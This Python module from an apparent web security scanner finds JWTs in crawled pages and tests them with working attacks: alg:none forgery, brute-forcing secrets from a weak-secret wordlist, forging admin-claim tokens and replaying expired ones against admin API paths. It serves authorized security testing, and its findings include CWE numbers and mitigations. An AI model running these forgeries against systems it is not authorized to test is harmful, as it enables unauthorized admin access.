"""
detection/jwt_analyzer.py — JWT weakness detector and privilege escalation tester.

Finds JWTs anywhere in the scan (response bodies, headers, cookies, HTML),
then attempts:

  1. Decode & inspect  — read claims without verifying (base64 only).
     Flags: missing exp, isAdmin=false (escalation target), sensitive data in payload.

  2. Algorithm confusion (alg:none) — re-sign the token with no signature,
     setting isAdmin/role to admin values. Tests whether the server accepts it.

  3. Weak secret brute-force — try a list of common secrets with HMAC-SHA256.
     If cracked, forges an admin token and tests it.

  4. Expired token reuse — if the token has an exp in the past, test whether
     the server still honours it (missing expiry validation).

All forged tokens are tested against the original request URL and a set of
known admin paths, so findings include concrete evidence of exploitation.
"""

import base64
import hashlib
import hmac
import json
import logging
import re
import time
from typing import Optional
from urllib.parse import urljoin

import httpx

from config import DEFAULT_TIMEOUT
from detection.finding import Finding

log = logging.getLogger(__name__)

# ── JWT regex — matches standard 3-part base64url tokens ─────────────────────
_JWT_RE = re.compile(
    r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*"
)

# ── Common weak secrets to brute-force ───────────────────────────────────────
_WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "test", "changeme",
    "qwerty", "letmein", "welcome", "default", "master",
    "jwt_secret", "jwtsecret", "jwt-secret", "jwt_secret_key",
    "your_secret_key", "supersecret", "super_secret", "supersecretkey",
    "app_secret", "appsecret", "application_secret",
    "key", "secretkey", "secret_key", "mykey",
    "dev", "development", "staging", "production",
    "planit", "planit_secret", "planit-secret",
    "vulnbank", "vulnbank-jwt-do-not-share-abc123xyz",
    "vulnbank-jwt-secret-2024",
    "1234567890", "abcdefghij", "0000000000",
    "shhhhh", "keyboard cat", "mysecret",
    "tokensecret", "token_secret",
    "",   # empty string — alg=HS256 with empty key
]

# Paths to test forged admin tokens against
_ADMIN_TEST_PATHS = [
    "/api/admin",
    "/api/admin/users",
    "/api/admin/stats",
    "/api/admin/events",
    "/api/admin/config",
    "/api/admin/employees",
    "/admin",
    "/api/me",
    "/api/profile",
]


# ── JWT helpers ───────────────────────────────────────────────────────────────

def _b64url_decode(s: str) -> bytes:
    """Decode base64url, tolerating missing padding."""
    s = s.replace("-", "+").replace("_", "/")
    pad = 4 - len(s) % 4
    if pad != 4:
        s += "=" * pad
    return base64.b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _decode_jwt(token: str) -> Optional[tuple[dict, dict, str]]:
    """Return (header, payload, signature) or None if malformed."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header  = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def _sign_hs256(header_b64: str, payload_b64: str, secret: str) -> str:
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    return _b64url_encode(sig)


def _forge_token(original_payload: dict, secret: str, extra_claims: dict) -> str:
    """Build a new HS256-signed token with modified claims."""
    new_header  = {"alg": "HS256", "typ": "JWT"}
    new_payload = {**original_payload, **extra_claims}
    # Remove expiry so the forged token doesn't expire
    new_payload.pop("exp", None)
    new_payload["iat"] = int(time.time())

    h = _b64url_encode(json.dumps(new_header,  separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(new_payload, separators=(",", ":")).encode())
    s = _sign_hs256(h, p, secret)
    return f"{h}.{p}.{s}"


def _alg_none_token(original_payload: dict, extra_claims: dict) -> str:
    """Build an alg=none token (no signature)."""
    new_header  = {"alg": "none", "typ": "JWT"}
    new_payload = {**original_payload, **extra_claims}
    new_payload.pop("exp", None)

    h = _b64url_encode(json.dumps(new_header,  separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(new_payload, separators=(",", ":")).encode())
    return f"{h}.{p}."   # trailing dot, empty signature


def _admin_claims(payload: dict) -> dict:
    """Return claims that escalate privileges to admin."""
    extra: dict = {}
    if "isAdmin"  in payload: extra["isAdmin"]  = True
    if "is_admin" in payload: extra["is_admin"] = True
    if "role"     in payload: extra["role"]     = "admin"
    if "admin"    in payload: extra["admin"]    = True
    if "isEmployee" in payload: extra["isEmployee"] = True
    # If none of the above, add them all
    if not extra:
        extra = {"isAdmin": True, "is_admin": True, "role": "admin"}
    return extra


# ── Extractor ─────────────────────────────────────────────────────────────────

def _extract_tokens_from_pages(pages) -> list[tuple[str, str]]:
    """
    Return list of (token, source_url) from crawled pages.
    Looks in: response body, Set-Cookie headers.
    """
    found: list[tuple[str, str]] = []
    seen: set[str] = set()

    for page in pages:
        for token in _JWT_RE.findall(page.body or ""):
            if token not in seen:
                seen.add(token)
                found.append((token, page.url))
        # Check cookies
        cookie_header = page.headers.get("set-cookie", "")
        for token in _JWT_RE.findall(cookie_header):
            if token not in seen:
                seen.add(token)
                found.append((token, page.url))

    return found


# ── Main detector ─────────────────────────────────────────────────────────────

class JWTAnalyzer:
    """
    Finds JWTs in crawled pages, inspects claims, and attempts
    algorithm confusion and weak-secret attacks.
    """

    def __init__(
        self,
        client:  httpx.AsyncClient,
        origin:  str,
        timeout: int = DEFAULT_TIMEOUT,
    ):
        self.client  = client
        self.origin  = origin.rstrip("/")
        self.timeout = timeout

    async def analyze(self, pages) -> list[Finding]:
        tokens = _extract_tokens_from_pages(pages)
        if not tokens:
            log.debug("[JWT] No tokens found in crawled pages")
            return []

        log.info("[JWT] Found %d token(s) to analyze", len(tokens))
        findings: list[Finding] = []

        for token, source_url in tokens:
            decoded = _decode_jwt(token)
            if not decoded:
                continue
            header, payload, _ = decoded

            # 1. Passive inspection
            findings.extend(self._inspect(token, header, payload, source_url))

            # 2. alg:none attack
            alg_finding = await self._test_alg_none(token, header, payload, source_url)
            if alg_finding:
                findings.append(alg_finding)

            # 3. Weak secret brute-force
            secret, cracked_token = await self._brute_secret(token, header, payload)
            if secret is not None and cracked_token:
                f = await self._test_forged_token(
                    cracked_token, source_url,
                    f"Weak JWT secret cracked: {secret!r}",
                    "CRITICAL",
                )
                if f:
                    findings.append(f)

            # 4. Expired token reuse
            if self._is_expired(payload):
                exp_finding = await self._test_expired_token(token, source_url)
                if exp_finding:
                    findings.append(exp_finding)

        return findings

    # ── Passive inspection ────────────────────────────────────────────────────

    def _inspect(self, token: str, header: dict, payload: dict, source_url: str) -> list[Finding]:
        findings = []
        alg = header.get("alg", "unknown").upper()

        # Missing expiry
        if "exp" not in payload:
            findings.append(Finding(
                vuln_type="JWT Missing Expiry (no exp claim)",
                severity="MEDIUM",
                url=source_url,
                param="JWT",
                method="GET",
                request_example=f"# Token found at: {source_url}\n{token[:80]}...",
                response_indicator=f"alg={alg}, no exp claim in payload",
                evidence_snippet=json.dumps(payload, indent=2)[:400],
                description=(
                    "A JWT was found with no expiry (exp) claim. Tokens without "
                    "expiry are valid indefinitely — if stolen, they cannot be "
                    "invalidated without key rotation."
                ),
                mitigation="Always set an exp claim. Use short-lived tokens (15–60 min) with refresh token rotation.",
                cwe="CWE-613",
                confidence="HIGH",
            ))

        # isAdmin=false — privilege escalation target
        is_non_admin = (
            payload.get("isAdmin")   is False or
            payload.get("is_admin")  is False or
            payload.get("role")      in ("user", "viewer", "guest") or
            payload.get("admin")     is False
        )
        if is_non_admin:
            findings.append(Finding(
                vuln_type="JWT Privilege Escalation Target (isAdmin=false)",
                severity="INFO",
                url=source_url,
                param="JWT.payload",
                method="GET",
                request_example=f"# Decoded payload:\n{json.dumps(payload, indent=2)[:300]}",
                response_indicator="isAdmin/role indicates non-admin — target for alg:none or secret crack",
                evidence_snippet=json.dumps({k: v for k, v in payload.items()
                                             if k in ("isAdmin","is_admin","role","admin","username","sub")}, indent=2),
                description=(
                    "A JWT was found where the payload contains admin=false or role=user. "
                    "If the algorithm can be confused to 'none' or the signing secret is weak, "
                    "this token can be forged with isAdmin=true to gain admin access."
                ),
                mitigation="Use strong, random, high-entropy secrets. Verify alg in header matches expected server-side.",
                cwe="CWE-285",
                confidence="HIGH",
            ))

        # Sensitive data in payload
        sensitive_keys = {"password", "secret", "api_key", "apikey", "ssn", "creditcard", "private_key"}
        found_sensitive = [k for k in payload if k.lower() in sensitive_keys]
        if found_sensitive:
            findings.append(Finding(
                vuln_type="JWT Contains Sensitive Data",
                severity="HIGH",
                url=source_url,
                param="JWT.payload",
                method="GET",
                request_example=f"# Token at: {source_url}",
                response_indicator=f"Sensitive fields in payload: {found_sensitive}",
                evidence_snippet=json.dumps({k: "***" for k in found_sensitive}, indent=2),
                description=(
                    f"The JWT payload contains potentially sensitive fields: {found_sensitive}. "
                    "JWT payloads are base64-encoded, not encrypted — anyone who intercepts "
                    "the token can decode and read these values."
                ),
                mitigation="Never put secrets or PII in JWT payloads. Use opaque session tokens for sensitive data.",
                cwe="CWE-200",
                confidence="HIGH",
            ))

        return findings

    # ── alg:none attack ───────────────────────────────────────────────────────

    async def _test_alg_none(
        self, token: str, header: dict, payload: dict, source_url: str
    ) -> Optional[Finding]:
        extra = _admin_claims(payload)
        if not extra:
            return None

        forged = _alg_none_token(payload, extra)
        result = await self._probe_admin_paths(forged)
        if not result:
            return None

        accessible_url, status = result
        return Finding(
            vuln_type="JWT Algorithm Confusion (alg:none) — Admin Access Confirmed",
            severity="CRITICAL",
            url=accessible_url,
            param="Authorization header",
            method="GET",
            request_example=(
                f"# Original token from: {source_url}\n"
                f"# Forged alg:none token with {extra}:\n"
                f"Authorization: Bearer {forged[:120]}...\n\n"
                f"GET {accessible_url}\n"
                f"→ HTTP {status} (success)"
            ),
            response_indicator=f"alg:none forged token accepted — HTTP {status} at {accessible_url}",
            evidence_snippet=f"Original payload: {json.dumps(payload)[:200]}\nForged claims: {extra}",
            description=(
                "The server accepted a JWT with alg=none (no signature). An attacker can "
                "modify any claim — including isAdmin=true — without knowing the signing "
                "secret, gaining full admin access."
            ),
            mitigation=(
                "Reject JWTs with alg=none server-side. Hardcode the expected algorithm "
                "when verifying tokens — never trust the alg field from the token header itself."
            ),
            cwe="CWE-327",
            confidence="HIGH",
        )

    # ── Weak secret brute-force ───────────────────────────────────────────────

    async def _brute_secret(
        self, token: str, header: dict, payload: dict
    ) -> tuple[Optional[str], Optional[str]]:
        alg = header.get("alg", "").upper()
        if alg not in ("HS256", "HS384", "HS512"):
            return None, None

        parts = token.split(".")
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        original_sig  = _b64url_decode(parts[2]) if parts[2] else b""

        for secret in _WEAK_SECRETS:
            try:
                sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
                if hmac.compare_digest(sig, original_sig):
                    log.info("[JWT] Secret cracked: %r", secret)
                    extra  = _admin_claims(payload)
                    forged = _forge_token(payload, secret, extra)
                    return secret, forged
            except Exception:
                continue

        return None, None

    # ── Expired token test ────────────────────────────────────────────────────

    def _is_expired(self, payload: dict) -> bool:
        exp = payload.get("exp")
        if exp is None:
            return False
        return int(time.time()) > int(exp)

    async def _test_expired_token(self, token: str, source_url: str) -> Optional[Finding]:
        result = await self._probe_admin_paths(token)
        if not result:
            return None
        accessible_url, status = result
        return Finding(
            vuln_type="JWT Expiry Not Enforced",
            severity="HIGH",
            url=accessible_url,
            param="Authorization header",
            method="GET",
            request_example=f"Authorization: Bearer {token[:80]}...\nGET {accessible_url}\n→ HTTP {status}",
            response_indicator=f"Expired token accepted — HTTP {status}",
            evidence_snippet=f"Token from: {source_url}",
            description=(
                "An expired JWT (past its exp claim) was accepted by the server. "
                "This means stolen tokens remain valid indefinitely, regardless of "
                "their expiry timestamp."
            ),
            mitigation="Validate exp claim on every request. Reject tokens past their expiry.",
            cwe="CWE-613",
            confidence="HIGH",
        )

    # ── Forged token tester ───────────────────────────────────────────────────

    async def _test_forged_token(
        self, forged_token: str, source_url: str, reason: str, severity: str
    ) -> Optional[Finding]:
        result = await self._probe_admin_paths(forged_token)
        if not result:
            return None
        accessible_url, status = result
        return Finding(
            vuln_type=f"JWT Forged Admin Token Accepted — {reason}",
            severity=severity,
            url=accessible_url,
            param="Authorization header",
            method="GET",
            request_example=(
                f"# {reason}\n"
                f"Authorization: Bearer {forged_token[:120]}...\n\n"
                f"GET {accessible_url}\n→ HTTP {status}"
            ),
            response_indicator=f"Forged token accepted — HTTP {status} at {accessible_url}",
            evidence_snippet=reason,
            description=(
                f"A forged JWT with admin claims was accepted by the server ({reason}). "
                "Full administrative access is confirmed."
            ),
            mitigation="Rotate the JWT secret immediately. Use a minimum 256-bit cryptographically random secret.",
            cwe="CWE-327",
            confidence="HIGH",
        )

    async def _probe_admin_paths(self, token: str) -> Optional[tuple[str, int]]:
        """Try a token against admin paths. Return (url, status) on success."""
        headers = {"Authorization": f"Bearer {token}"}
        for path in _ADMIN_TEST_PATHS:
            url = self.origin + path
            try:
                resp = await self.client.get(
                    url, headers=headers,
                    timeout=self.timeout, follow_redirects=False,
                )
                if resp.status_code not in (200, 201, 204):
                    continue
                # Must be JSON — HTML means SPA catch-all, not a real API response
                ct = resp.headers.get("content-type", "").lower()
                if "html" in ct:
                    continue
                log.info("[JWT] Token accepted at %s (HTTP %d)", url, resp.status_code)
                return url, resp.status_code
            except Exception as exc:
                log.debug("[JWT] Probe error at %s: %s", url, exc)
        return None
      
